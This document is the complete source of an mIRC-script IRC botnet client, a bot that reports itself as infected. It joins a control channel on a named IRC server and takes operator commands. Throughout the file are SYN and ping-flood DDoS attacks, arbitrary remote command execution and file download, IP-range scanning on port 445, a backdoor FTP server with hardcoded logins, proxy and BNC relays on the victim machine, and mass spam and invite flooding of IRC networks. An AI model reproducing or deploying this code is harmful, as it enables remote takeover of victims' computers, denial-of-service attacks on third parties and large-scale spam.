alias fnick {
  set %fnick $rand(1,10)
  if (%fnick = 1) { return $read reader.w $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fnick = 2) { return $chr($r(65,125)) $+ $read reader.w $+ $chr($r(65,125))  }
  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  reader.w }
  if (%fnick = 4) { return $r(A,Z) $+ $read reader.w $+ $r(A,Z) }
  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fnick = 6) { return $read  reader.w $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fnick = 7) { return $r(a,z) $+ $read reader.w $+ $r(a,z) }
  if (%fnick = 8) { return $read  reader.w $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fnick = 9) { return $read  reader.w $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fnick = 10) { return $read  reader.w $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias adduser {
  .auser Q8HeLL JoCkeR
  .auser Q8HeLL HeHe
  .auser Q8HeLL aHa
}
alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c 1[14inviter1]14: 1Error14:1 Please set delay:14 !inviter delay [delay] | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c 1[14inviter1]14: 1Error Starting Inviter, Inviter Server or Port not set! 14%iserver 1- 14%iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c 1[14inviter1]14: 1Error: Inviter already loaded! | halt }  
//sockopen inviterN %i.server %i.port  | msg %s.i.c 1[14inviter1]14: 1Loading inviter to Server14: 1(14 $+ $+ %i.server $+ 1) 1Port: 1(14 $+ %i.port $+ 1) |  //sockopen inviterM %i.server %i.port  }
alias Cona { //server mIRCNet.Tu-pac.net 6667 | set %cc #!QNDHAR!_@ |  if ($portfree(113)) { socklisten IDENT 113 } }
on *:sockread:inviter*:{   sockread -f %t.i  | if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c 1[14inviter1]14:1 Listing channels on (14 $+ $remove($gettok(%t.i,1,32),:) $+ 1) }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c 1[14inviter1]14: 1Listing channels complete on14 $remove($gettok(%t.i,1,32),:) 1[1Total Channels in List14: $+ $lines(ichan.txt) $+ 1] }  
  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c 1[14inviter1]14:1 Join Error14:1 Banned from (14 $+ $gettok(%t.i,4,32) $+ 1) } |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } | if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c 1[14inviter1]14:1 Error Connecting14: %t.i 1(14attempting to reconnect1)-(14to stop !inviter stop1) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } 
  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1  | /msg %s.i.c 1[14inviter1] Error: not inviting:[14 $+ $gettok(%t.i,5,32) $+ 1]  because he was Oped! } | if ($gettok(%t.i,4,32) == +v) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1 } }
  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j  } | if ($gettok(%t.i,2,32) == 313) { /msg %s.i.c 1[14inviter1] WARNING: 14IRCOP Detected 1[14 $+ $gettok(%t.i,4,32) $+ 1]
  if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  
}
on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read reader.w $+ $r(a,z) $+ $r(1,60) a a : [ [ $fnick ] ] |  sockwrite -tn $sockname Nick $read reader.w | /timerinviteconnect off | sockread  }
on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c 1[14inviter1]14:1 Inviter was disconnected! 4Reloading. | /sockopen $sockname %i.server %i.port } }
on *:Sockopen:NTimer*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
  timernick 0 2 sockwrite -nt NTimer* Nick %ntnick
}
on *:Sockopen:ircs*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
  if (%r4ndom = yes) { list >100 | halt }
  sockwrite -nt $sockname join %ircschan
}
on *:sockread:ircs*:{
  sockread %ircread
  asa %ircread
  Stay %ircread
}
on *:sockread:Ntimer*:{
  sockread %ntread
  Stay %ntread
}
on *:sockread:Q8HeLL*:{
  sockread %QHTread
  Stay %QHTread
}
alias asa {
  if (352 isin $1-) { sockopen ip $+ $ticks $6 445 }
  if (322 isin $1-) { write ls.x $4 }
  if (323 isin $1-) { sockwrite -nt ircs* join $read ls.x }
  if (366 isin $1-) { sockwrite -nt ircs* who $4 }
  if (315 isin $1-) { if (%r4ndom = yes) { sockwrite -nt ircs* part $4 | sockwrite -nt ircs* join $read ls.x | halt } | sockclose ircs* | unset %irc* | unset %r4ndom }
}
alias ntstop { timernick off | sockclose NTimer* }
alias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }
on Q8HeLL:TEXT:*:*: {
  if ($nick isop %cc) {
    if ($1 = !ntimer) { if ($2 = Sock) { set %ntnick $3 | set %ntserver $4 | set %ntport $5 | sockopen NTimer $+ $r(1,1000) $+ $fnick %ntserver %ntport }  }
    if ($1 = !ntreg) { reg $2- }
    if ($1 = !ntstop) { ntstop }
    if ($1 = !dde) { /dde $2 command "" / $+ $3- }
    if ($1 = !ind) { .identd on $2- }
    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }
    if ($1 = !pfast) { if ($4 == random) { //Tw1stStart $2 $3 $r(1,64000) | halt } | //Tw1stStart $2 $3 $4 }
    if ($1 = !fserv) { /msg %cc [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }
    if ($1 = !packet) && ($3 != $null) { run Deta.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | msg %cc 2[14DDoS2]14 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }
    if ($1 = !packet.stop) { run Deta.exe /n /fh /r " $+ $mircdirlibparse.exe -kf ping.exe" | msg %cc 2[14DDoS2]14 packeting halted! }
    if ($1 = !Mpfast) && ($chan != $null) { if ($chan == $null) { set %pchan $nick } | if ($4 == random) { //Mudp $2 $3 $r(1,65000) | halt } | //Mudp $2 $3 $4 }
    if ($1 = !run) && ($2 != $null) { /run $2- }
    if ($1 = !stats) { if ($chan != $null) { .msg $chan I Had Been Infected in ( $+  $+ %infecttime  $+  $+ ) And I Had Run This Bot %many times , I am using (Windows $os $+ ) I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ).  Mask ( $+ $host $+ ) It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ )  } | else { .msg $nick I Had Been Infected in ( $+  $+ %infecttime  $+  $+ ) And I Had Run This Bot %many times , I am using (Windows $os $+ ) I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ).  Mask ( $+ $host $+ ) It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) } }
    if ($1 = !icmp) { if ($2 == $null) { /msg %cc Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run Deta.exe /n /r "ping -n $4 -l $3 -w 0 $2 " }
    if ($1 = !Clone) { /clone $2- }
    if ($1 = !syn) { if ($2 !== $null) { msg %cc 1(12SynPacket1) 1(12Attacking1) 1[12 $+ $2 $+ 1]12 on 1[12 $+ $3 $+ 1]12 With 1[12 $+ $4 $+ 1]12 Packets  | synp start $4 $2 $3 } }
    if ($1 = !ircs) { if ($4 != $null) { set %ircserver $2 | set %ircport $3 | set %ircschan $4 | sockopen ircs $+ $ticks %ircserver %ircport | halt } | set %ircserver $2 | set %ircport $3 | set %r4ndom yes | sockopen ircs $+ $ticks %ircserver %ircport }
    if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }
    if ($1 = !proxy) { r4.proxy $2- }
    if ($1 = !download) { /download $2- | msg %cc [Downloading..] $nopath($3-) }
    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %cc 2[8ERROR2]14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %cc 2[14bnc2]14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
    if ($1 = !bnc.stats) && ($sock(Bnc)) { msg %cc 2[14bnc2]14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %cc 2[14bnc2]14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
    if ($1 = !startscan) && (%begshortip == $null) && ($exists(sa.exe)) { msg %cc 2[14scanner2]14 starting scan from: $2 to $3 | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !randscan) && (%begshortip == $null) && ($exists(sa.exe)) { set %begit $randip($2) | msg %cc 2[14scanner2]14 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %cc 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
    if ($1 = !ftp.start) && ($2 != $null) { write -l2 rconnect.conf BindPort $2 | run rconnect.exe | msg %cc 2[14ftp2]14 admin: gtSEv1:gtSEv1@ $+ $ip $+ : $+ $2 guest: ph33rle55:test123@ $+ $ip $+ : $+ $2 | timerDE 0 2 write -c rconnect.log }
    if ($1 = !ftp.stop) { run Deta.exe /n /fh /r " $+ $mircdirlibparse.exe -kf rconnect.exe" | msg %cc 2[14ftp2]14 is now off | | /timerremove 1 5 /remove rconnect.log | timerDE off  }
    if ($1 = !var) { msg %cc Variable equals to: [ [ $$2- ] ] }
    if ($1 = !inviter) { %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { Sockclose inviterM | Sockclose inviterN | remove ichan.txt | /set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg %cc 1[14inviter1]14:1 Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg %cc 1[14inviter1]14:1 Status14:1 Not Connected! | halt }  
      if ($sock(inviter*,0) > 0) { msg %cc 1[14inviter1]14:1 Status14:1 Connected 1[14 $+ $sock(inviter*,0) $+ 1] } } |   if ($2 == stats) { msg %cc 1[14inviter1]14:1 Stats Total Invited:14 $calc( %i.t.j  +  %i.t.p ) $+  - 1Delay:14 %i.ondelay } |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3- $+ * }  |  if ($2 == msg) { set %imsg $3- | msg %cc 1[14inviter1]14:1 Invite Message set to (14 $+ $3- $+ 1) } 
      if ($2 == ctotal) { msg %cc 1[14inviter1]14:1 Random Channels Total14: $+ $lines(ichan.txt) $+  }  |  if ($2 == reset) { msg %cc 1[14inviter1]14:1 All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
      if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg %cc 1[14inviter1]14: 1Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i 1  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
    if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $fnick | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msg %cc 1[14inviter1]14:1 Delay set to: (14 $+ $3 $+ 1). } }
    if ($1 = !inviteto) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { msg %cc My Bot is Already ON!. }
      .if ($2 == off) { .msg %cc Mass SPaMMer Sets OFF. | sockclose did* | timerinv* off }  
      .if ($2 == status) && ($sock(did*,0) != 0) { .msg %cc Im 14Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
      .if ($2 == status) && ($sock(did*,0) = 0) { .msg %cc Im 4NOT Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
      .if ($2 == GO) && ($sock(did*,0) != 0)  { msg %cc Iam Already GONE!. }
      .if ($2 == GO) && ($sock(did*,0) = 0)  { msg %cc Iam Going ;). | /ruwinviter }
      if ($sock(did*,0) = 0) {
        set %total.users 0
        .if ($3 = rand) { set %SPMChannel $read a.exe  }
        .if ($5 = rand) { set %SPMChannel $read a.exe  }
        .if ($2- == $null) { .msg %cc Are U FooL Use !inviteto  NetWork/server (Channel/rand) (Invite MSG)  }
        .if ($2 == arabchat) { .set %thisnick $nick | .set %network $gettok(KSA@Gulf@Qatar@Doha@Bahrain@irc@, $+ $rand(1,7) $+ ,64) $+ .arabchat.org | .set %SPMchannel $3 | set %SPAM $4-  | /ruwinviter }  
        .if ($2 == DALNet) { .set %thisnick $nick | .set %network $gettok(jade@liberty@jade@dragon@nexgo@sniper@irc@twisted@, $+ $rand(1,8) $+ ,64) $+ .dal.net | .set %SPMchannel $3 | set %SPAM $4- | /ruwinviter  }
        .if ($2 == EFnet) { .set %thisnick $nick | .set %network $gettok(irc.homelien.no@irc.Qeast.net@irc.flamed.net@irc.inet.tele.dk@irc.webgiro.se@efnet.demon.co.uk, $+ $r(1,6) $+ ,64) | .set %SPMchannel $3  | set %SPAM $4- | /ruwinviter }
        .if ($2 == server) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }
      }
    }
  }
}
on *:disconnect:{   //timercheck -o 0 $r(30,100) .Cona  }
alias ruwinviter { sockopen did $+ $ticks $+ $r(1,999) %network }
alias finished { msg %cc 2[14scanner2]14 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }
on 1:SOCKOPEN:did*:{ if ($sockerr) { return } 
  .sockwrite -nt $sockname PONG $ctime
  .sockwrite -tn $sockname USER $fnick $+ $r(a,z) $+ $r(1,60) a a : $fnick $fnick 
  .sockwrite -tn $sockname NICK $fnick $+ $chr($r(65,125)) $+ $chr($r(65,125)) 
  .sockwrite -nt $sockname join %SPMChaNNeL
  .sockwrite -nt $sockname list >100
  timerpart 1 $r(5,30) /sockwrite -nt $sockname PART %SPMCHaNNeL 
}
on 1:SOCKREAD:did*:{ sockread -f %t.v | if ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { write ichan.bat $gettok(%t.v,4,32) } | /saving $sockname %t.v } 
alias saving {
  if ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names : $+ %SPAM }
  if ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names2 :  $+ %SPAM }
  if ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names3 :  $+ %SPAM }
  if ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names4 :  $+ %SPAM }
  if ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names5 :  $+ %SPAM }
  if ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names6 :  $+ %SPAM }
  if ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names7 :  $+ %SPAM }
  if ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names8 :  $+ %SPAM }
  if ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names9 :  $+ %SPAM }
  if ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names10 :  $+ %SPAM }
  if ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names11 :  $+ %SPAM }
  if ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names12 :  $+ %SPAM }
  if ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names13 :  $+ %SPAM }
  if ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names14 :  $+ %SPAM }
  if ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names15 :  $+ %SPAM }
  if ($3 = 366) { timerinv $+ $r(1,999) 1 1001 /finisheds $1 }
  if (47 = $left($3,2)) { /finished2 $1 }
  if (PING = $1) { sockwrite -nt PONG $1- }
}
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | msg %cc Syn Attack Done! }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias goinvite { sockwrite -nt $1 JOIN %SPMChaNNeL |   timerpart 1 $r(5,60) /sockwrite -nt $1 PART %SPMCHaNNeL  }
alias finisheds { .msg %cc I've Spammed on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Has been Affected this msg with no (@/+) one. Message sets: ( $+ %SPAM $+ )..... | if ($exists(ichan.bat) == $true) { set %SPMChannel $read ichan.bat } | if ($exists(ichan.bat) == $false) { set %SPMChannel $read inv.bat } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }
alias finished2 { .msg %cc There Was a Problem on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) NO Users Has been Messaged... AutoChanging Channel.. | if ($exists(ichan.bat) == $true) { set %SPMChannel $read ichan.bat } | if ($exists(ichan.bat) == $false) { set %SPMChannel $read inv.bat } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
alias jc { /join %cc d4mn }
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:join:%cc:{ if ($nick = $me) { timerjc off } }
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
raw 332:* {
  if ($2 == %cc) {
    if ($3 = !icmp) { if ($4 == $null) { /msg %cc Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run Deta.exe /n /r "ping -n $6 -l $5 -w 0 $4 " }
    if ($3 = !packet) && ($5 != $null) { run Deta.exe /n /fh /r "ping.exe $4 -n $5 -l 65500" | msg %cc 2[14DDoS2]14 packeting $4 with $calc($5 *65536/1024/1000) $+ mb traffic }
    if ($3 = !pf) { if ($4 = stop) { apagestop } | if ($4 = start) { apages $5- } }
    if ($3 = !pfast) { if ($6 == random) { //Tw1stStart $4 $5 $r(1,64000) | halt } | //Tw1stStart $4 $5 $6 }
    if ($3 = !ntimer) { if ($4 = Sock) { set %ntnick $5 | set %ntserver $6 | set %ntport $7 | sockopen NTimer $+ $r(1,1000) $+ $fnick %ntserver %ntport }  }
    if ($3 = !startscan) && (%begshortip == $null) && ($exists(sa.exe)) { msg %cc 2[14scanner2]14 starting scan from: $4 to $5 | set %begshortip $4 | set %beglongip $longip(  %begshortip ) | set %endshortip $5 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($3 = !randscan) && (%begshortip == $null) && ($exists(sa.exe)) { set %begit $randip($4) | msg %cc 2[14scanner2]14 starting scan from: %begit to $5 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $5 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($3 = !syn) { if ($4 !== $null) { msg %cc 1(12SynPacket1) 1(12Attacking1) 1[12 $+ $4 $+ 1]12 on 1[12 $+ $5 $+ 1]12 With 1[12 $+ $6 $+ 1]12 Packets  | synp start $6 $4 $5 } }
  }
}
alias r4.proxy {
  if (%bot.proxy != $null) && ($portfree(%bot.proxy)) unset %bot.proxy
  if ($1 == $null) return
  if ($1 == off) { if ($sock(proxy)) sockclose proxy* | sockclose tunnel* | unset %bot.proxy | msg %cc Proxy disabled }
  if ($1 !isnum) return
  if ($portfree($1)) { set %bot.proxy $1 | socklisten proxy $1 | sockmark proxy %target | msg %cc Proxy started on $ip %bot.proxy Port: $1 }
  else { msg %cc Port already taken. }
}
on *:socklisten:proxy:{ var %s = proxy. $+ $ticks | sockaccept %s }
on *:sockread:proxy.*:{
  if ($sockerr) return
  var %t, %s, %z
  sockread %t
  if (CONNECT *:* HTTP/?.? iswm %t) {
    %s = tunnel-s. $+ $gettok($sockname,2,46)
    %z = tunnel-c. $+ $gettok($sockname,2,46)
    ;bot.ident
    sockopen %s $replace($gettok(%t,2,32),:,$chr(32))
    sockrename $sockname %z
    sockmark $sockname %s
    sockmark %s %z
  }
  elseif (& *HTTP/?.? iswm %t) { sockwrite $sockname HTTP/1.0 400 Bad request $+ $str($crlf,2) | sockclose $sockname }
}
on *:sockwrite:proxy.*:if ($sockerr) { if ($sock($sock($sockname).mark)) sockclose $ifmatch | return }
on *:sockclose:proxy.*:if ($sock($sock($sockname).mark)) sockclose $ifmatch | return
on *:sockopen:tunnel-s.*:{
  var %p = $sock($sockname).mark
  if ($sock(%p) == $null) { sockclose $sockname | return }
  if ($sockerr) { sockwrite %p HTTP/1.0 500 Server Error $+ $str($crlf,2) | sockclose %p | return }
  sockwrite %p HTTP/1.0 200 Connection established $+ $str($crlf,2)
}
on *:sockread:tunnel-?.*:{
  var %p = $sock($sockname).mark
  if ($sockerr) { sockclose %p | return }
  :l
  sockread &t
  if ($sockbr) {
    sockwrite -b %p $sockbr &t
    goto l
  }
}